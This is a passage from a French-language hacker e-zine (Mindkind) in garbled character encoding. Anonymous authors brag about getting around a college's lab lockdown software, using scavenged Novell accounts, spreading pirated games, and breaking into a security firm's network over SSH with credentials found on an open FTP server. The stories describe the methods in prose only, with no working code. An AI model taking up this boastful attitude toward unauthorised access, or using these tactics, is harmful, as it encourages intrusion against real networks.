M'enfin le fun "technique" qu'on avait avec τa, c'Θtait les parties de run  and
hide avec les techniciens de la  place. Bien sur y'avait plus que  les stickers
"JEU INTERDIT", les techniciens devaient  passer tout leur temps α  trouver des
nouveaux programmes de blockage. Le reste du temps il ghostait les machines qui
avaient des jeux dessus. Un jour il  se sont mΩme dΘcidΘs α dΘcrisser tous  les
CDROM sur 3 Θtages et α visser les machines avec des barres de mΘtal, faut dire
que le cΘgep  Θtait le main  supplier de stock  volΘ d'ordi de MontrΘal j'pense
(haha). M'enfin lα on  Θtait pognΘ avec une  triste rΘalitΘ : pu  de CDROM pour
pouvoir jouer. Les  seuls CDROM qui  restaient Θtait dans  un local au  160iΦme
Θtage qui Θtait  occupΘ du matin  au soir.. quoi  faire? J'me rappelle  un jour
quelqu'un avait emmenΘ Starcraft sur disquette, genre 46 ou 47 disk. Le  disque
24 Θtait corrompu.  Crap. Alors on  dΘcida de se  la jouer WAREZ.  On pogna une
version warez  de notre  jeu qu'on  voulait, et  on allait  au 160iΦme Θtage le
loader sur les machines pour  ensuite le transfΘrer. Par contre  c'Θtait chiant
on Θtait obliger de monter en haut α chaque fois qu'on voulait jouer, on aurait
pu se faire crΘditer un cours d'Θducation physique avec τa je pense. M'enfin un
jour on a eu Internet plus rapide, alors on avait pu besoin d'aller au  160iΦme
downloader nos CD, on pouvait downloader τa direct d'une dump sur le net... par
contre τa allait pas  assez vite pareil. On  a commencΘ a spotter  des machines
bΓtardes  dans des  locaux normaux,  et on  a faite  des backups.  Y'avait des
backups de nos jeux partout, dans  au moins 5-6 endroits stratΘgiques. DΦs  que
le technicien ghostait nos  locaux de jeu (faut  dire que nos prΘfΘrΘs  Θtaient
ceux en administration avec les machines les plus ressentes, ah pis yavait mΩme
un lab qui avait des cartes 3d..  heheh) nous on revenait avec nos backups  qui
Θtait sur  un FTP  a quelque  part dans  l'Θcole... α  1meg/seconde (LAN speed)
c'Θtait plut⌠t rapide (et  peu forτant a faire).  Mais la un jour  on est tombΘ
sur de quoi de WEIRD, "ne peut copier le exe"...

Les techniciens c'Θtait dΘcidΘs α  nous mettre des pseudo-protections. Bon  ok,
en rΘalitΘ, on  avait dΘjα Fortress  (un programme plut⌠t  cheap), mais y'Θtait
tellement simple  α bypasser  du genre  tu pΦse  sur CTRL-ALT-DEL  avant que la
machine soit totalement bootΘe pis tu la kill. Y'a eu aussi le fait qui pouvait
nous retracer avec nos accounts Novell, donc on s'est mit α pogner des accounts
qui traεnaient dans les bac α  rΘcupΘration. Mais lα, "ne peut copier  le exe",
c'Θtait  weird.. y'avait  aucun programme  qui roulait,  mais on  a  finit  par
trouver un programme de contr⌠le α quelque part dans Program Files, mais aucuns
signes de  o∙ est-ce  que τa  roule cette  merde lα...  alors j'ai  cherchΘ sur
Internet. Pis j'ai trouvΘ  τa : The blabla software installs itself as a VXD...
un VXD putain d'criss. Faut dire qu'on avait des machines Win95 (pouha, mais τa
allait bien pour gamer.. hehe), le VXD c'Θtait vraiment l'ultime shit. On avait
le truc pour pouvoir Θditer la  base de registre (fallait juste runner  le prog
d'edit rights win9x dans le  rΘpertoire de l'installation de win95..  qui Θtait
mappΘ sur  un drive  rΘseau... haha),  donc j'ai  pu aller  voir quelle merde y
loadait. AprΦs un peu de recherche, j'ai trouvΘ le fameux CACA.vxd, j'ai deletΘ
la ligne, rebootΘ, et rien. Y'Θtait  revenu le sale. J'ai dΘcider de  booter en
dos pour voir (avec un boot disk, le safe mode and shit Θtait scrap), pis je me
suis rendu compte  que yavait un  beau rΘpertoire ultra-cachΘ  (avec le VXD  me
semble) qui contenait un backup de  la base de registre and stuff.  J'ai Θditer
le .bat qui runnait  τa (REM REM REM!!!)  pis j'ai rebootΘ, ΘditΘ  le registre,
rebootΘ, succΦs. AprΦs τa c'Θtait plut⌠t fastoche de faire un ti batch file pis
un .reg qui edit tout α notre place.. et voila on avait la clef de la rapiditΘ.
On a pu jouer encore plus, toute en continuant de faire dla crap ailleurs  dans
le CΘgep (je crois que les techs  on finit par lΓcher prise, y faisaient  juste
ghoster α la  fin) parce que  juste jouer facilement  Θtait rendu un  peu moins
lfun  pour  moi.  Et c'est  ainsi  que  3-4 personnes  pochΦrent  leurs  DEC en
informatique α cause du gaming. Aujourd'hui on s'est recyclΘs en autre chose de
plus officiel, mais on continue de jouer, mais moi jsuis pas un gamer (ah).

Bon fak c'Θtait τa  l'histoire, c'Θtait plut⌠t cheapo  comme hack mais le  fun,
peut-Ωtre que τa va inspirer la gΘnΘration future... malgrΘ que  WinXPEE  c'est
plus facile α owner, mΩme pas besoin d'Ωtre assit devant l'ordi! hehe


+------------------------------------------------------------------------------+


- La curiositΘ est une vilaine qualitΘ

Dans le temps j'Θtais dans une crew de divx pis de warez, c'Θtait au dΘbut  des
FTP pubs fak  on scannait pour  pouvoir FXP notre  stock dessus. Un  jour je me
suis mis α trouver des FTP  qu'on avait accΦs α plusieurs rΘpertoires.  C'Θtait
des sites qui Θtaient  pointΘs via le web  et via complΦtement un  autre ip (ou
nom de domaine). J'me suis pas cassΘ  la tΩte j'ai uploadΘ du warez dessus  pis
on avait une dump HTTP qui Θtait  impossible de trouver par quel FTP y  fallait
uploader, plut⌠t neat.  Un jour je  suis tomber sur  de quoi de louche, y'avait
pleins de rΘpertoires, et dans un rΘpertoire en particulier des fichiers Excell
et Access.  J'ai downloadΘ  les files,  puis j'ai  trouvΘ dans  les fichiers de
database, que yavait des user/pass.  Malheureusement y'avait aucun ip, juste le
nom de la machine "mail1.stupidnet" genre. J'ai mis τa de cotΘ et j'ai continuΘ
mon scan de FTP. La journΘe d'aprΦs j'Θtais encore dans le mΩme coin (genre  le
FTP Θtait sur 64.4.4.4 et je scannais  sur 64.6.*) pis lα j'ai pognΘ un  FTP en
Windows qui ma sorti un connect  string avec genre : ftp1.stupidnet Je  me suis
rappelΘ mon mail1.stupidnet, et j'ai criΘ BINGO! AprΦs τa j'ai essayΘ  le  host
complet genre mail1.levrainet.com et j'ai vu  qui avait le port ssh de  ouvert,
j'ai essayΘ des user/pass, et τa  l'a marchΘ. Avec cette porte d'ouverte,  j'ai
pu owner leur rΘseau Linux (serveurs) et Windows (stations). C'Θtait le  rΘseau
de 2 gars qui avaient une compagnie qui faisait de la sΘcuritΘ  informatique...
genre snort Θtait installer sur certaines machines, mais bon, j'ai mΩme pas  eu
besoin de scanner ou  d'essayer rien d'autre que  d'entrer un user/pass en  ssh
pour pouvoir avoir accΦs local. Fin de l'histoire.


+------------------------------------------------------------------------------+


Bon voilα c'Θtait nos  histoires. Faites-nous signe si  vous avez aimΘs τa,  si
vous voulez  sender vos  histoires on  va les  mΓcher /  hacher /  reformuler /
digΘrer / recontextualiser  / ridiculiser /  ultraordinariser pour vous  et les
publier dans le prochain  Hack Reader Digest. Par  contre il est a  noter qu'on
prends juste des "hack" vieux de 2 ans, pis qu'on tient compte que mΩme si  les
hack sont rΘalistes, ils peuvent Ωtre  faux, on s'en fiche, on avoue  rien ici,
on ne fait que raconter des histoires pour divertir...

Et c'est signΘ : anoymousses.


            ___                                                           ___
     .----/   /----------- ---------- --------- - -- - - --- -----------/   /
     |   /   /                                                         /   /|
     :  /   /                                                         /   / :
     | /   /                mindkind@mindkind.org                    /   /  |
     |/   /                                                         /   /   | 
     /___/-- ---------- -----  ----------------- - ------- -- --- -/___/----'




Mindkind prΘsente : "Story that didnt makes it for Hack Reader's Digest"
                    aka "On aurait pas du dire Harlequin dans l'intro"

Tout c'est passΘ l'ΘtΘ dernier alors que j'Θtais en vacances chez ma tante.  Il
fesait beau  et le  soleil plombait  a 50  degrΘs celcius  - presque assez pour
vaporiser l'eau que  contenait la magnifique  piscine devant moi.  L'aprΦs-midi
battait son plein quand je l'ai aperτu  pour la premiΦre fois elle Θtait lα,  a
se  dorer au  soleil ces  jolies courbes  me rappelaient  celles  d'une  sirΦne
remontΘe du plus  profond de la  mer. Elle avait  une couleur parfaite  et elle
semblait si puissante mais si coquine,  α la fois douce et trΦs  jolie, presque
parfaite.  TatouΘe   de  trois   lettres  sur   les  hanches,   je  ne  pouvais
malheureusement  pas les  lire car  j'Θtais trop  loin. Puis,  en  prenant  mon
courage je me suis levΘ, tranquillement en utilisant une dΘmarche s√re mais pas
inquisitoire. Plus  je m'approchais,  plus je  la voyais  et plus  je l'aimais.
J'avais envie de la dΘlivrer de cette chaleur torride Je m'assied α cotΘ d'elle
et avec  quelques mouvements  brefs je  l'avais conquise.  Elle rΘpondait a mes
moindres gestes comme si je pouvais Ωtre en symbiose avec elle. J'ai longuement
jouΘ  avec elle  jusqu'α la  tombΘe de  la nuit,  l'heure o∙  j'ai  d√  quitter
l'endroit. Encore aujourd'hui je me demande qui avait laissΘ traεner un serveur
Athlon MP sur le bord d'une piscine a 50░C. TrΦs Θnigmatique...


                                                                          
                +------------------+                                      
                |  FΘlicitations   |                                      
                |  vous avez lu    |                                      
                |  le e-zine au    |                                      
                |  complet. Vous   |                                      
                |  Ωtes maintenant |                                      
                |  α la            |                                      
                |          FIN.    |    
                +--------<>--------+                                      
 //                      ||                                               
   //                    ||                                               
     //                  ||                                               
       //                ||                                               
         //              ||                                               
           //            ||                                               
             //          ||                 +----------------+            
#              //        ||                 |  FΘlicitations |            
###              //      ||                 |  vous avez     |            
  ###              //   ,||,                |  atteint les   |            
                     //                     |  limites       |            
                       /i                   |  inexplorΘes   |            
         ###             /n                 |  de ce fichier |            
           ###             /i               +-------<>-------+            
/            ###             /t                     ||                    
 //                            /_                   ||                    
   //                            /n                 ||                    
     //                            /u               ||                    
       //            ###             /l             ||                    
         //            ###             /l           ||                    
           //            ###             //         ||                    
             //                            //       ||      +-----------+ 
               //                            //    ,||,     | Prochain  | 
                 //             E              01           | Segment:  | 
                   //             O              00         | 0x32323432| 
                     //             F              10       +-----<>----+ 
                       //                            11           ||      
                         //                            11         ||      
                           01            1               00       ||      
                             00            1               00    ,||,     
                               00            0               10           
On vous a encore fait le coup    11                            10         
de l'exploitation d'un event α des 01                            10       
fins commerciales. N'y prenez pas    00             1                     
habitude, en effet n'allez pas croire  11             1                   
qu'on va vous Θcrire α la St-Valentin    10              1                
pour vous dire qu'on vous aime.            10                             
                                 








`````````````````````````

</div>
